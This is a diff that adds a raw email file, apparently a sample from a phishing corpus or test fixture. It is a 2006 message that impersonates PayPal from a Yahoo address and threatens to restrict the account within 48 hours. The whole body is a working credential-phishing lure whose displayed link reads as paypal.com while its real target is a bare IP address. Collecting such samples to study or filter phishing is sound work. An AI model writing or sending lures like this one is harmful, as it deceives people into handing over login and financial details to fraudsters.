@@ -1,0 +1,99 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <confirms981@yahoo.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 4EA09469DD
+ for <user@login.example.com>; Fri, 29 Sep 2006 12:34:16 -0400 (EDT)
+Received: from relay3.mail.twtelecom.net (relay3.mail.twtelecom.net
+ [216.136.95.10])
+ by mail.example.org (Postfix) with ESMTP id 656DB6FA53D
+ for <user@example.com>; Fri, 29 Sep 2006 12:34:16 -0400 (EDT)
+Received: from bkmail.local (206-80-3-91.static.twtelecom.net [206.80.3.91])
+ by relay3.mail.twtelecom.net (Postfix) with ESMTP id 56F2149C0;
+ Fri, 29 Sep 2006 11:34:10 -0500 (CDT)
+Received: from service ([216.182.45.6])
+ (authenticated user editorial@bkpub.com)
+ by bkmail.local (Kerio MailServer 6.2.1);
+ Fri, 29 Sep 2006 09:34:07 -0700
+From: "PayPal Inc." <confirms981@yahoo.com>
+Subject: PayPal Confirm Message !
+Date: Fri, 29 Sep 2006 12:33:57 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20060929163410.56F2149C0@relay3.mail.twtelecom.net>
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 345
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>PayPal Inc.</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body>
+<table width="96%" border="1" align="center" bordercolor="#004C4D" cellpadding="0" cellspacing="0">
+  <tr> 
+    <td bgcolor="#3399FF" height="46" align="left" valign="top" bordercolor="#3399FF"> 
+    </td>
+  </tr>
+  <tr> 
+    <td bgcolor="#FFFFFF" bordercolor="#3399FF"> 
+      <p align="left"></p>
+      <p>&nbsp; </p>
+      <blockquote> 
+        <blockquote> 
+          <p><font color="#006633"><b><font color="#004C4D">Dear PayPal Customer,</font></b></font></p>
+        </blockquote>
+      </blockquote>
+      <p></p>
+      <blockquote> 
+        <p><font color="#004C4D"><b>It has come to our attention that your 
+        account information needs to be updated as part of our continuing 
+        commitment to protect your account and to reduce the instance of fraud 
+        on our website.</b></font></p>
+        <font color="#004C4D"><b> If you could please take 5-10 minutes out of 
+        your online experience and update your personal records you will not run 
+        in any future problems with the online service. </b></font> 
+        <p><font color="#004C4D"><b>
+        <p><font color="#004C4D"><b>&nbsp;&nbsp;&nbsp;To get started please click 
+          the link below: <br>
+          </b><a href="http://163.27.71.66/images/icon.html">
+        https://www.paypal.com/us/cgi-bin/webscr?cmd=login-run</a></font></p>
+        <font color="#004C4D"><b> If your account information is not updated within 
+        <font color="#FF0000">48 hours</font> then your ability to use your online 
+        account will become restricted.</b></font>
+        <p><font color="#004C4D"><b>Thank you for your prompt attention to this 
+          matter. Please understand that this is a security measure meant to help 
+          protect your privacy and your account.</b></font></p>
+        <p><font color="#004C4D"><b><br>
+          We apologize for any inconvenience this may cause, and appreciate your 
+          assistance in helping us maintain the integrity of the entire PayPal System.</b></font></p>
+      </blockquote>
+      <p></p>
+      <blockquote> 
+        <p><font color="#004C4D"><b><br>
+          Sincerely,<br>
+          The PayPal Security Group</b></font></p>
+      </blockquote>
+      
+      <p align="center">&nbsp;</p>
+    </td>
+  </tr>
+  <tr>
+    <td bgcolor="#FFFFFF" bordercolor="#3399FF">&nbsp;</td>
+  </tr>
+</table>
+</body>
+</html>
